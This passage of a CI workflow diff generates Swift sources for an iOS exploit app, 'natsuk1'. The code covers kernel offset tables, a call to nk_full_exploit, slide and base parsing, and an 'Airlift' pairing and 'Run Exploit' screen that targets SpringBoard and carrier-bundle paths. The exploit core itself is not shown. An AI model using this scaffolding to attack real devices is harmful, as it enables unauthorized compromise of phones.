+                  let ios: String
+                  let build: String
+                  let verified: Bool
+              }
+
+              struct Index: Codable {
+                  let versions: [VersionEntry]
+              }
+
+              private struct File: Codable {
+                  let groups: [Group]
+                  let defaults: [String: String]
+              }
+
+              nonisolated private static let bundled: File? = {
+                  guard let fileURL = resolveActiveFileURL() else { return nil }
+                  guard let fileData = try? Data(contentsOf: fileURL),
+                        let parsed = try? JSONDecoder().decode(File.self, from: fileData)
+                  else { return nil }
+                  return parsed
+              }()
+
+              nonisolated static var groups: [Group] { bundled?.groups ?? [] }
+              nonisolated static var defaults: [String: String] { bundled?.defaults ?? [:] }
+
+              nonisolated private static func loadIndex() -> Index? {
+                  guard let url = Bundle.main.url(forResource: "index", withExtension: "json", subdirectory: "Offsets"),
+                        let data = try? Data(contentsOf: url),
+                        let index = try? JSONDecoder().decode(Index.self, from: data)
+                  else { return nil }
+                  return index
+              }
+
+              nonisolated private static func resolveActiveEntry() -> VersionEntry? {
+                  guard let index = loadIndex() else { return nil }
+                  let device = DeviceName.machineID()
+                  let v = ProcessInfo.processInfo.operatingSystemVersion
+                  let ios = "\(v.majorVersion).\(v.minorVersion)"
+                  return index.versions.first(where: { $0.device == device && $0.ios == ios })
+                      ?? index.versions.first(where: { $0.device == device })
+              }
+
+              nonisolated private static func resolveActiveFileURL() -> URL? {
+                  guard let entry = resolveActiveEntry() else { return nil }
+                  let parts = entry.file.split(separator: ".", maxSplits: 1).map(String.init)
+                  let name = parts.first ?? entry.file
+                  let ext = parts.count > 1 ? parts[1] : "json"
+                  return Bundle.main.url(forResource: name, withExtension: ext, subdirectory: "Offsets")
+                      ?? Bundle.main.url(forResource: name, withExtension: ext)
+              }
+
+              @Published var values: [String: String] = [:]
+
+              private let storageKey = "natsuk1_offsets_v2"
+
+              private init() { load() }
+
+              private func persistNow() {
+                  UserDefaults.standard.set(values, forKey: storageKey)
+              }
+
+              func load() {
+                  let saved = UserDefaults.standard.dictionary(forKey: storageKey) as? [String: String]
+                  var merged = Self.defaults
+                  if let saved = saved {
+                      for (k, v) in saved where merged[k] != nil { merged[k] = v }
+                  }
+                  DispatchQueue.main.async {
+                      self.values = merged
+                      if saved == nil { self.persistNow() }
+                  }
+              }
+
+              func save() {
+                  DispatchQueue.main.async { self.persistNow() }
+              }
+
+              func reset() {
+                  DispatchQueue.main.async {
+                      self.values = Self.defaults
+                      self.persistNow()
+                  }
+              }
+
+              func resetOne(_ name: String) {
+                  DispatchQueue.main.async {
+                      var next = self.values
+                      next[name] = Self.defaults[name] ?? "0x0"
+                      self.values = next
+                      self.persistNow()
+                  }
+              }
+
+              func update(_ name: String, value: String) {
+                  DispatchQueue.main.async {
+                      var next = self.values
+                      next[name] = value
+                      self.values = next
+                      self.persistNow()
+                  }
+              }
+
+              func value(for name: String) -> String {
+                  values[name] ?? Self.defaults[name] ?? "0x0"
+              }
+
+              func filledCount() -> Int {
+                  values.filter { $0.value != "0x0" && !$0.value.isEmpty }.count
+              }
+
+              func totalCount() -> Int {
+                  Self.groups.reduce(0) { $0 + $1.items.count }
+              }
+          }
+          OFFSETS_EOF
+
+      - name: Write DeviceName
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/DeviceName.swift <<'DEVNAME_EOF'
+          import Foundation
+          import UIKit
+
+          enum DeviceName {
+
+              private struct Device {
+                  let id: String
+                  let name: String
+                  let chip: String
+              }
+
+              private static let devices: [Device] = [
+                  Device(id: "iPhone11,2", name: "iPhone XS",           chip: "A12 Bionic"),
+                  Device(id: "iPhone11,4", name: "iPhone XS Max",       chip: "A12 Bionic"),
+                  Device(id: "iPhone11,6", name: "iPhone XS Max",       chip: "A12 Bionic"),
+                  Device(id: "iPhone11,8", name: "iPhone XR",           chip: "A12 Bionic"),
+                  Device(id: "iPhone12,1", name: "iPhone 11",           chip: "A13 Bionic"),
+                  Device(id: "iPhone12,3", name: "iPhone 11 Pro",       chip: "A13 Bionic"),
+                  Device(id: "iPhone12,5", name: "iPhone 11 Pro Max",   chip: "A13 Bionic"),
+                  Device(id: "iPhone12,8", name: "iPhone SE (2nd gen)", chip: "A13 Bionic"),
+                  Device(id: "iPhone13,1", name: "iPhone 12 mini",      chip: "A14 Bionic"),
+                  Device(id: "iPhone13,2", name: "iPhone 12",           chip: "A14 Bionic"),
+                  Device(id: "iPhone13,3", name: "iPhone 12 Pro",       chip: "A14 Bionic"),
+                  Device(id: "iPhone13,4", name: "iPhone 12 Pro Max",   chip: "A14 Bionic"),
+                  Device(id: "iPhone14,2", name: "iPhone 13 Pro",       chip: "A15 Bionic"),
+                  Device(id: "iPhone14,3", name: "iPhone 13 Pro Max",   chip: "A15 Bionic"),
+                  Device(id: "iPhone14,4", name: "iPhone 13 mini",      chip: "A15 Bionic"),
+                  Device(id: "iPhone14,5", name: "iPhone 13",           chip: "A15 Bionic"),
+                  Device(id: "iPhone14,6", name: "iPhone SE (3rd gen)", chip: "A15 Bionic"),
+                  Device(id: "iPhone14,7", name: "iPhone 14",           chip: "A15 Bionic"),
+                  Device(id: "iPhone14,8", name: "iPhone 14 Plus",      chip: "A15 Bionic"),
+                  Device(id: "iPhone15,2", name: "iPhone 14 Pro",       chip: "A16 Bionic"),
+                  Device(id: "iPhone15,3", name: "iPhone 14 Pro Max",   chip: "A16 Bionic"),
+                  Device(id: "iPhone15,4", name: "iPhone 15",           chip: "A16 Bionic"),
+                  Device(id: "iPhone15,5", name: "iPhone 15 Plus",      chip: "A16 Bionic"),
+                  Device(id: "iPhone16,1", name: "iPhone 15 Pro",       chip: "A17 Pro"),
+                  Device(id: "iPhone16,2", name: "iPhone 15 Pro Max",   chip: "A17 Pro"),
+                  Device(id: "iPhone17,1", name: "iPhone 16 Pro",       chip: "A18 Pro"),
+                  Device(id: "iPhone17,2", name: "iPhone 16 Pro Max",   chip: "A18 Pro"),
+                  Device(id: "iPhone17,3", name: "iPhone 16",           chip: "A18"),
+                  Device(id: "iPhone17,4", name: "iPhone 16 Plus",      chip: "A18"),
+                  Device(id: "iPhone17,5", name: "iPhone 16e",          chip: "A18"),
+                  Device(id: "iPhone18,1", name: "iPhone 17 Pro",       chip: "A19 Pro"),
+                  Device(id: "iPhone18,2", name: "iPhone 17 Pro Max",   chip: "A19 Pro"),
+                  Device(id: "iPhone18,3", name: "iPhone 17",           chip: "A19"),
+                  Device(id: "iPhone18,4", name: "iPhone Air",          chip: "A19 Pro"),
+                  Device(id: "iPhone18,5", name: "iPhone 17e",          chip: "A19"),
+              ]
+
+              private static let byID: [String: Device] = Dictionary(
+                  uniqueKeysWithValues: devices.map { ($0.id, $0) }
+              )
+
+              static func friendly() -> String {
+                  let id = machineID()
+                  return byID[id]?.name ?? id
+              }
+
+              static func chip() -> String {
+                  byID[machineID()]?.chip ?? "unknown"
+              }
+
+              static func machineID() -> String {
+                  var info = utsname()
+                  uname(&info)
+                  var bytes: [UInt8] = []
+                  for el in Mirror(reflecting: info.machine).children {
+                      guard let v = el.value as? Int8 else { continue }
+                      if v == 0 { break }
+                      bytes.append(UInt8(bitPattern: v))
+                  }
+                  return String(decoding: bytes, as: UTF8.self)
+              }
+          }
+          DEVNAME_EOF
+
+      - name: Write AppState
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/App
+          cat > natsuk1/App/natsuk1.swift <<'APP_EOF'
+          import SwiftUI
+          import UIKit
+          import Foundation
+
+          final class LockedBuffer: @unchecked Sendable {
+              static let shared = LockedBuffer()
+              private let lock = NSLock()
+              private var value: String = ""
+              private init() {}
+
+              func append(_ s: String) {
+                  lock.lock(); value += s + "\n"
+                  if value.count > 10000 { value = String(value.suffix(6000)) }
+                  lock.unlock()
+              }
+
+              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
+
+              func clear() { lock.lock(); value = ""; lock.unlock() }
+          }
+
+          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
+              guard let line = line else { return }
+              var bytes: [UInt8] = []
+              var p = line
+              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
+              let text = String(decoding: bytes, as: UTF8.self)
+              LockedBuffer.shared.append(text)
+              AppState.shared.parseLogLine(text)
+          }
+
+          private func osVersionString() -> String {
+              let v = ProcessInfo.processInfo.operatingSystemVersion
+              return "\(v.majorVersion).\(v.minorVersion)"
+          }
+
+          private func appVersionString() -> String {
+              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
+          }
+
+          final class RespringEscape: NSObject {
+              static let shared = RespringEscape()
+              weak var host: UIViewController?
+
+              @objc func dismiss(_ gesture: UITapGestureRecognizer) {
+                  host?.dismiss(animated: false)
+                  host = nil
+              }
+          }
+
+          @main
+          struct natsuk1App: App {
+              var body: some Scene { WindowGroup { RootView() } }
+          }
+
+          struct RootView: View {
+              @StateObject private var state = AppState.shared
+              @StateObject private var offsets = OffsetsStore.shared
+              @StateObject private var airlift = AirliftBridge.shared
+              @AppStorage("auto_run") private var auto_run = false
+              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
+              @AppStorage("keep_alive_location") private var keep_alive_location = false
+              @Environment(\.scenePhase) private var scenePhase
+
+              init() {
+                  UserDefaults.standard.register(defaults: [
+                      "auto_run": false,
+                      "keep_alive_audio": false,
+                      "keep_alive_location": false,
+                      "lang": "en",
+                  ])
+              }
+
+              var body: some View {
+                  ContentView()
+                      .environmentObject(state)
+                      .environmentObject(offsets)
+                      .environmentObject(airlift)
+                      .environmentObject(CarrierLabState.shared)
+                      .onAppear {
+                          nk_set_log(cCallback)
+                          if state.log.isEmpty {
+                              state.append("[*] natsuk1 v\(appVersionString())")
+                              state.append("[*] iOS \(osVersionString()) / arm64e")
+                              state.append("")
+                          }
+                          if keep_alive_audio { KeepAlive.shared.startAudio() }
+                          if keep_alive_location { KeepAlive.shared.startLocation() }
+                          if auto_run { DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() } }
+                      }
+                      .onChange(of: keep_alive_audio) { _, v in
+                          if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
+                      }
+                      .onChange(of: keep_alive_location) { _, v in
+                          if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
+                      }
+              }
+          }
+
+          final class AppState: ObservableObject, @unchecked Sendable {
+              static let shared = AppState()
+
+              @Published var slide: String = "-"
+              @Published var base: String = "-"
+              @Published var log: String = ""
+              @Published var status: Status = .idle
+              @Published var running: Bool = false
+              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
+
+              enum Status {
+                  case idle, running, ok, failed
+                  var color: Color {
+                      switch self {
+                      case .idle: return .secondary
+                      case .running: return .orange
+                      case .ok: return .green
+                      case .failed: return .red
+                      }
+                  }
+              }
+
+              private var flusher: Timer?
+
+              private init() {
+                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
+                  startFlusher()
+              }
+
+              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
+
+              func parseLogLine(_ line: String) {
+                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
+                      DispatchQueue.main.async { if self.slide != v { self.slide = v } }
+                  }
+                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
+                      DispatchQueue.main.async { if self.base != v { self.base = v } }
+                  }
+              }
+
+              private static func extractHex(_ s: String, keys: [String]) -> String? {
+                  for k in keys {
+                      if let r = s.range(of: k) {
+                          var hex = ""
+                          for c in s[r.upperBound...] {
+                              if c.isHexDigit { hex.append(c) } else { break }
+                          }
+                          if !hex.isEmpty { return "0x" + hex }
+                      }
+                  }
+                  return nil
+              }
+
+              private func startFlusher() {
+                  flusher?.invalidate()
+                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
+                      guard let self = self else { return }
+                      let chunk = LockedBuffer.shared.drain()
+                      if chunk.isEmpty { return }
+                      DispatchQueue.main.async {
+                          var newLog = self.log
+                          newLog += chunk
+                          if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
+                          self.log = newLog
+                      }
+                  }
+              }
+
+              func append(_ s: String) { LockedBuffer.shared.append(s) }
+
+              func run() {
+                  DispatchQueue.main.async {
+                      guard !self.running else { return }
+                      self.running = true
+                      self.status = .running
+                      let state = self
+                      DispatchQueue.global(qos: .userInitiated).async {
+                          let rc = nk_full_exploit()
+                          DispatchQueue.main.async {
+                              state.running = false
+                              state.status = (rc == 0) ? .ok : .failed
+                          }
+                      }
+                  }
+              }
+
+              func respring() {
+                  DispatchQueue.main.async {
+                      guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
+                            let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
+                            let root = window.rootViewController else { return }
+                      let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
+                      host.modalPresentationStyle = .fullScreen
+                      host.view.backgroundColor = .black
+                      let escape = UITapGestureRecognizer(target: RespringEscape.shared,
+                                                          action: #selector(RespringEscape.dismiss(_:)))
+                      escape.numberOfTapsRequired = 2
+                      escape.cancelsTouchesInView = false
+                      host.view.addGestureRecognizer(escape)
+                      RespringEscape.shared.host = host
+                      root.present(host, animated: false)
+                  }
+              }
+
+              func clear() {
+                  LockedBuffer.shared.clear()
+                  DispatchQueue.main.async { self.log = "" }
+              }
+
+              func cancel() {
+                  append("[*] cancel requested")
+              }
+          }
+          APP_EOF
+
+      - name: Write AirliftView
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Views
+          cat > natsuk1/Views/AirliftView.swift <<'AIRLIFTVIEW_EOF'
+          import SwiftUI
+          import UIKit
+          import Combine
+
+          struct AirliftView: View {
+              @EnvironmentObject var airlift: AirliftBridge
+              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
+              @State private var tunnelIP: String? = NetworkStatus.tunnelIP()
+              @State private var deviceIP: String? = NetworkStatus.deviceIP()
+              @State private var copied = false
+              @State private var pairedTick = 0
+
+              private let ticker = Timer.publish(every: 0.5, on: .main, in: .common).autoconnect()
+
+              var body: some View {
+                  List {
+                      statusSection
+                      sessionSection
+                      pairingStatusSection
+                      pairingButtonsSection
+                      targetSection
+                      exploitSection
+                      logSection
+                      logActionsSection
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("Airlift")
+                  .navigationBarTitleDisplayMode(.inline)
+                  .onAppear { refresh(); pairedTick &+= 1 }
+                  .onReceive(ticker) { _ in refresh() }
+                  .onChange(of: airlift.state) { _, _ in pairedTick &+= 1 }
+                  .refreshable { refresh(); pairedTick &+= 1 }
+              }
+
+              private var statusSection: some View {
+                  Section {
+                      HStack(spacing: 12) {
+                          Image(systemName: loopbackVPNUp ? "checkmark.circle.fill" : "exclamationmark.circle.fill")
+                              .font(.system(size: 22))
+                              .foregroundStyle(loopbackVPNUp ? .green : .orange)
+                              .shadow(color: (loopbackVPNUp ? Color.green : Color.orange).opacity(0.45), radius: 3)
+                          VStack(alignment: .leading, spacing: 3) {
+                              Text("LocalDevVPN")
+                              Text(loopbackVPNUp ? "Connected" : "Not connected")
+                                  .font(.subheadline)
+                                  .foregroundStyle(loopbackVPNUp ? .green : .orange)
+                                  .shadow(color: (loopbackVPNUp ? Color.green : Color.orange).opacity(0.45), radius: 3)
+                          }
+                          Spacer()
+                      }
+                      .padding(.vertical, 4)
+                  } header: { Label("VPN", systemImage: "shield.lefthalf.filled") }
+              }
+
+              private var sessionSection: some View {
+                  Section {
+                      HStack {
+                          Text("Tunnel IP")
+                          Spacer()
+                          Text(tunnelIP ?? "\u{2014}")
+                              .font(.system(.body, design: .monospaced))
+                              .foregroundStyle(tunnelIP != nil ? .green : .secondary)
+                              .shadow(color: tunnelIP != nil ? Color.green.opacity(0.45) : Color.clear, radius: 3)
+                      }
+                      HStack {
+                          Text("Device IP")
+                          Spacer()
+                          Text(deviceIP ?? "\u{2014}")
+                              .font(.system(.body, design: .monospaced))
+                              .foregroundStyle(deviceIP != nil ? .green : .secondary)
+                              .shadow(color: deviceIP != nil ? Color.green.opacity(0.45) : Color.clear, radius: 3)
+                      }
+                  } header: { Label("Session details", systemImage: "network") }
+              }
+
+              private var pairingStatusSection: some View {
+                  Section {
+                      if let pin = airlift.pairPIN {
+                          pinCard(pin: pin)
+                      } else {
+                          HStack(spacing: 12) {
+                              Image(systemName: pairingIcon)
+                                  .font(.system(size: 22))
+                                  .foregroundStyle(pairingColor)
+                              VStack(alignment: .leading, spacing: 3) {
+                                  Text(pairingTitle)
+                                  Text(pairingSubtitle)
+                                      .font(.subheadline)
+                                      .foregroundStyle(pairingColor)
+                                      .shadow(color: pairingColor.opacity(0.45), radius: 3)
+                                      .lineLimit(3)
+                              }
+                              Spacer()
+                          }
+                          .padding(.vertical, 4)
+                      }
+                  } header: { Label("Pairing", systemImage: "link.circle") }
+              }
+
+              @ViewBuilder
+              private func pinCard(pin: String) -> some View {
+                  VStack(alignment: .leading, spacing: 14) {
+                      HStack(spacing: 6) {
+                          Image(systemName: "lock.shield.fill")
+                              .foregroundStyle(.orange)
+                              .shadow(color: Color.orange.opacity(0.45), radius: 3)
+                          Text("Enter this PIN in Settings")
+                              .font(.footnote)
+                              .foregroundStyle(.secondary)
+                      }
+                      HStack(spacing: 10) {
+                          ForEach(Array(pin.enumerated()), id: \.offset) { _, ch in
+                              Text(String(ch))
+                                  .font(.system(size: 32, weight: .semibold, design: .rounded))
+                                  .foregroundStyle(.orange)
+                                  .shadow(color: Color.orange.opacity(0.45), radius: 3)
+                                  .frame(width: 44, height: 56)
+                                  .background(Color.orange.opacity(0.12), in: RoundedRectangle(cornerRadius: 10, style: .continuous))
+                          }
+                          Spacer()
+                      }
+                      Button {
+                          if let url = URL(string: UIApplication.openSettingsURLString) {
+                              UIApplication.shared.open(url)
+                          }
+                      } label: {
+                          Text("Open Settings").frame(maxWidth: .infinity)
+                      }
+                      .buttonStyle(.borderedProminent)
+                      .tint(.orange)
+                      .controlSize(.large)
+                      .shadow(color: Color.orange.opacity(0.45), radius: 3)
+                      Text("Privacy & Security - Developer Mode - Pair with natsuk1")
+                          .font(.caption2)
+                          .foregroundStyle(.secondary)
+                  }
+                  .padding(.vertical, 6)
+              }
+
+              private var pairingButtonsSection: some View {
+                  Section {
+                      Button { airlift.runPairing() } label: {
+                          Text(isPaired ? "Already Paired" : "Start Pairing")
+                      }
+                      .disabled(isPairing || isPaired)
+                      Button(role: .destructive) { airlift.cancelPairing() } label: {
+                          Text("Cancel Pairing")
+                      }
+                      .disabled(!isPairing)
+                      Button(role: .destructive) { airlift.deletePairing(); pairedTick &+= 1 } label: {
+                          Text("Delete Pairing")
+                      }
+                      .disabled(!airlift.pairingFileExists())
+                  }
+              }
+
+              private var targetSection: some View {
+                  Section {
+                      HStack {
+                          Text("Target")
+                          Spacer()
+                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
+                              get: { airlift.target }, set: { airlift.target = $0 }))
+                              .font(.system(.footnote, design: .monospaced))
+                              .multilineTextAlignment(.trailing)
+                              .autocorrectionDisabled()
+                              .textInputAutocapitalization(.never)
+                      }
+                  } header: { Label("Target", systemImage: "scope") }
+              }
+
+              private var exploitSection: some View {
+                  Section {
+                      Button { airlift.runExploit() } label: {
+                          HStack {
+                              Text("Run Exploit")
+                              Spacer()
+                              if airlift.state == .running { ProgressView() }
+                          }
+                      }
+                      .disabled(airlift.state == .running || !loopbackVPNUp || !isPaired)
+                      Button(role: .destructive) { airlift.cancelExploit() } label: {
+                          Text("Cancel Exploit")
+                      }
+                      .disabled(airlift.state != .running)
+                  } header: { Label("Exploit", systemImage: "cpu") }
+              }
+
+              @ViewBuilder
+              private var logSection: some View {
+                  if !airlift.exploitLog.isEmpty {
+                      Section {
+                          ScrollView {
+                              Text(airlift.exploitLog.joined(separator: "\n"))
+                                  .font(.system(size: 10, design: .monospaced))
+                                  .frame(maxWidth: .infinity, alignment: .leading)
+                          }
+                          .frame(minHeight: 200, maxHeight: 400)
+                      } header: { Label("Log", systemImage: "terminal") }
+                  }
+              }
+
+              @ViewBuilder
+              private var logActionsSection: some View {
+                  if !airlift.exploitLog.isEmpty {
+                      Section {
+                          Button {
+                              UIPasteboard.general.string = airlift.exploitLog.joined(separator: "\n")
+                              copied = true
+                              DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { copied = false }
+                          } label: {
+                              Text(copied ? "Copied" : "Copy All")
+                          }
+                          Button(role: .destructive) { airlift.clearLog() } label: {
+                              Text("Clear")
+                          }
+                      } header: { Label("Log Actions", systemImage: "document.on.document") }
+                  }
+              }
+
+              private func refresh() {
+                  let vpn = NetworkStatus.loopbackVPNUp()
+                  let tun = NetworkStatus.tunnelIP()
+                  let dev = NetworkStatus.deviceIP()
+                  if loopbackVPNUp != vpn { loopbackVPNUp = vpn }
+                  if tunnelIP != tun { tunnelIP = tun }
+                  if deviceIP != dev { deviceIP = dev }
+              }
+
+              private var isPairing: Bool {
+                  if case .pairing = airlift.state { return true }
+                  return false
+              }
+
+              private var isPaired: Bool {
+                  _ = pairedTick
+                  return airlift.hasPairing()
+              }
+
+              private var pairingColor: Color {
+                  if isPaired { return .green }
+                  if isPairing { return .orange }
+                  if case .done(false, _) = airlift.state { return .red }
+                  return .secondary
+              }
+
+              private var pairingIcon: String {
+                  if isPaired { return "checkmark.circle.fill" }
+                  if isPairing { return "link.circle.fill" }
+                  if case .done(false, _) = airlift.state { return "xmark.circle.fill" }
+                  return "link.circle"
+              }
+
+              private var pairingTitle: String {
+                  if isPaired { return "Paired" }
+                  if isPairing { return "Pairing" }
+                  if case .done(false, _) = airlift.state { return "Failed" }
+                  return "Not Paired"
+              }
+
+              private var pairingSubtitle: String {
+                  if isPaired { return "Credentials saved" }
+                  if isPairing {
+                      return airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus
+                  }
+                  if case .done(false, let msg) = airlift.state { return msg }
+                  return "Open Settings to pair"
+              }
+          }
+          AIRLIFTVIEW_EOF
+
+      - name: Write DeviceInfoView
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Views
+          cat > natsuk1/Views/DeviceInfoView.swift <<'DEVICEINFO_EOF'
+          import SwiftUI
+          import UIKit
+
+          struct DeviceInfoView: View {
+              var body: some View {
+                  List {
+                      Section {
+                          row("Model", DeviceName.friendly())
+                          row("Identifier", DeviceName.machineID())
+                          row("Chip", DeviceName.chip())
+                      } header: { Label("Hardware", systemImage: "cpu") }
+
+                      Section {
+                          row("iOS", sysctlString("kern.osproductversion"))
+                          row("Build", sysctlString("kern.osversion"))
+                          row("Architecture", arch())
+                      } header: { Label("Software", systemImage: "gear") }
+
+                      Section {
+                          row("RAM", ram())
+                          row("Uptime", uptime())
+                      } header: { Label("Resources", systemImage: "memorychip") }
+
+                      Section {
+                          row("Locale", localeShort())
+                          row("Region", regionShort())
+                      } header: { Label("Locale", systemImage: "globe") }
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("Device")
+                  .navigationBarTitleDisplayMode(.inline)
+              }
+
+              private func row(_ key: String, _ value: String) -> some View {
+                  HStack {
+                      Text(key)
+                      Spacer()
+                      Text(value)
+                          .font(.system(.body, design: .monospaced))
+                          .foregroundStyle(.green)
+                          .lineLimit(1)
+                          .truncationMode(.middle)
+                  }
+              }
+
+              private func sysctlString(_ name: String) -> String {
+                  var size = 0
+                  guard sysctlbyname(name, nil, &size, nil, 0) == 0, size > 0 else { return "—" }
+                  var buf = [CChar](repeating: 0, count: size)
+                  guard sysctlbyname(name, &buf, &size, nil, 0) == 0 else { return "—" }
+                  let bytes = buf.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }
+                  let text = String(decoding: bytes, as: UTF8.self)
+                  return text.isEmpty ? "—" : text
+              }
+
+              private func ram() -> String {
+                  var size: UInt64 = 0
+                  var len = MemoryLayout<UInt64>.size
+                  guard sysctlbyname("hw.memsize", &size, &len, nil, 0) == 0 else { return "—" }
+                  return ByteCountFormatter.string(fromByteCount: Int64(size), countStyle: .memory)
+              }
+
+              private func arch() -> String {
+                  #if arch(arm64)
+                  return "arm64"
+                  #else
+                  return "unknown"
+                  #endif
+              }
+
+              private func localeShort() -> String {
+                  Locale.current.identifier.split(separator: "_").first.map(String.init)?.uppercased() ?? "—"
+              }
+
+              private func regionShort() -> String {
+                  let region = Locale.current.region?.identifier ?? ""
+                  return region.isEmpty ? "—" : region.uppercased()
+              }
+
+              private func uptime() -> String {
+                  let t = ProcessInfo.processInfo.systemUptime
+                  guard t.isFinite, t >= 0, t < Double(Int.max) else { return "—" }
+                  let seconds = Int(t)
+                  return "\(seconds / 3600)h \((seconds % 3600) / 60)m"
+              }
+          }
+          DEVICEINFO_EOF
+
+      - name: Write AboutView
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Views
+          cat > natsuk1/Views/AboutView.swift <<'ABOUT_EOF'
+          import SwiftUI
+          import UIKit
+
+          struct AboutView: View {
+              @Environment(\.openURL) private var openURL
+              @EnvironmentObject var state: AppState
+
+              private static let repoURL = URL(string: "https://github.com/murk-sus/asuka4scape-source-vulnerabilities")
+
+              private var appName: String {
+                  Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String
+                      ?? Bundle.main.infoDictionary?["CFBundleName"] as? String ?? "natsuk1"
+              }
+              private var version: String {
+                  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
+              }
+              private var build: String {
+                  Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "1"
+              }
+
+              var body: some View {
+                  List {
+                      Section {
+                          VStack(alignment: .leading, spacing: 6) {
+                              Text(appName).font(.title2).fontWeight(.semibold)
+                              Text("Version \(version) (\(build))").font(.subheadline).foregroundStyle(.secondary)
+                              Text("Research project iOS.").font(.footnote).foregroundStyle(.secondary)
+                          }
+                          .padding(.vertical, 6)
+                      }
+                      Section {
+                          linkRow("Source Repository", url: Self.repoURL)
+                          linkRow("MIT License", url: Self.repoURL?.appendingPathComponent("blob/main/LICENSE"))
+                          linkRow("Star on GitHub", url: Self.repoURL?.appendingPathComponent("stargazers"))
+                      } header: { Text("Open Source") }
+                      Section { } header: { Text("Disclaimer") }
+                      footer: {
+                          Text("Independent research project. Not affiliated with Apple Inc.")
+                              .font(.footnote).foregroundStyle(.secondary)
+                      }
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("About")
+                  .navigationBarTitleDisplayMode(.inline)
+              }
+
+              @ViewBuilder
+              private func linkRow(_ title: String, url: URL?) -> some View {
+                  if let url = url {
+                      Button { openURL(url) } label: {
+                          HStack {
+                              Text(title).foregroundStyle(.tint)
+                              Spacer()
+                              Image(systemName: "chevron.right")
+                                  .font(.system(size: 13, weight: .semibold))
+                                  .foregroundStyle(.tertiary)
+                          }
+                      }
+                      .buttonStyle(.plain)
+                  }
+              }
+          }
+          ABOUT_EOF
+
       - name: Write CarrierLabBridge
         run: |
           set -euo pipefail
           mkdir -p natsuk1/CarrierLab
-          cat > natsuk1/CarrierLab/CarrierLabBridge.swift <<'BRIDGE_EOF'
+          cat > natsuk1/CarrierLab/CarrierLabBridge.swift <<'CLBRIDGE_EOF'
           import Foundation
+
+          private let injectLogCallback: @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void = { _, msg in
+              guard let msg = msg else { return }
+              CarrierLabState.shared.appendLog("[ffi] " + String(cString: msg))
+          }
 
           final class CarrierLabBridge: @unchecked Sendable {
               static let shared = CarrierLabBridge()
@@ -234,11 +1849,10 @@ jobs:
                   }
               }
 
-              private let carrierRoot = "/var/mobile/Library/Carrier Bundles/iPhone"
-              private let bundleLinks = "/var/mobile/Library/Carrier Bundles"
+              static let carrierUserRoot = "/var/mobile/Library/Carrier Bundles"
+              static let carrierRoot = "/var/mobile/Library/Carrier Bundles/iPhone"
 
-              func carrierRootPath() -> String { carrierRoot }
-              func bundleLinksPath() -> String { bundleLinks }
+              static let defaultSlots = ["Carrier1Bundle.bundle", "Operator1Bundle.bundle"]
 
               func findPairingFile() -> String? {
                   let fm = FileManager.default
@@ -247,34 +1861,38 @@ jobs:
                       let size = (try? fm.attributesOfItem(atPath: canonical)[.size] as? Int) ?? 0
                       if size > 0 { return canonical }
                   }
-                  let docs = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
-                  let candidates = [
-                      docs.appendingPathComponent("natsuk1_pairing.plist").path,
-                      docs.appendingPathComponent("ALTPairingFile.mobiledevicepairing").path,
-                  ]
-                  for c in candidates {
-                      if fm.fileExists(atPath: c) {
-                          let size = (try? fm.attributesOfItem(atPath: c)[.size] as? Int) ?? 0
-                          if size > 0 { return c }
+                  if let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first {
+                      let candidates = [
+                          docs.appendingPathComponent("natsuk1_pairing.plist").path,
+                          docs.appendingPathComponent("ALTPairingFile.mobiledevicepairing").path,
+                      ]
+                      for c in candidates {
+                          if fm.fileExists(atPath: c) {
+                              let size = (try? fm.attributesOfItem(atPath: c)[.size] as? Int) ?? 0
+                              if size > 0 { return c }
+                          }
                       }
                   }
                   return nil
               }
 
-              private func validatePairingFile(_ path: String) -> (Bool, String) {
+              func validatePairingFile(_ path: String) -> (Bool, String) {
                   let fm = FileManager.default
                   guard fm.fileExists(atPath: path) else { return (false, "missing") }
                   let size = (try? fm.attributesOfItem(atPath: path)[.size] as? Int) ?? 0
                   if size < 50 { return (false, "Pairing file too small (\(size) bytes).") }
-                  guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)) else {
-                      return (false, "Pairing file unreadable.")
+                  let kind = PairingFileKind.of(path: path)
+                  if !kind.isUsable {
